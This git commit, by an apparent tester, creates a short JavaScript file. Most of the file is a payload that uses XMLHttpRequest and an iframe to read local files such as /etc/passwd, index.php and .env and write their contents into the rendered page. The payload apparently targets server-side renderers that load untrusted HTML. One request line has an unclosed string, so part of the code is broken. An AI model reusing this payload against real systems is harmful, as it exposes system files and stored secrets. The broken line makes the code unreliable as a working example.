25ea77c9c5067561c58df3c0129e16df052d44ff
Shahid Nawaz <80408404+ShahidKalwani@users.noreply.github.com>
2024-03-11 02:22:43 +0500

    Create t.js

---
+++ t.js
@@ -0,0 +1,25 @@
+console.log("file called");
+
+console.log("welcome");
+console.log("another updated");
+// request
+x=new XMLHttpRequest;
+x.onload=function(){document.write(this.responseText)};
+x.open("GET","file:///etc/passwd");
+console.log("trying to read file");
+console.log(x.send());
+
+x=new XMLHttpRequest;
+x.onload=function(){document.write(this.responseText)};
+console.log("trying to read file");
+x.open("GET","file:///index.php");
+console.log("trying to read file");
+console.log(x.send());
+
+x=new XMLHttpRequest;
+x.onload=function(){document.write(this.responseText)};
+x.open("GET","file:///.env);
+console.log(x.send());
+document.write('<iframe src=file:///etc/passwd></iframe>');
+
+// udpated
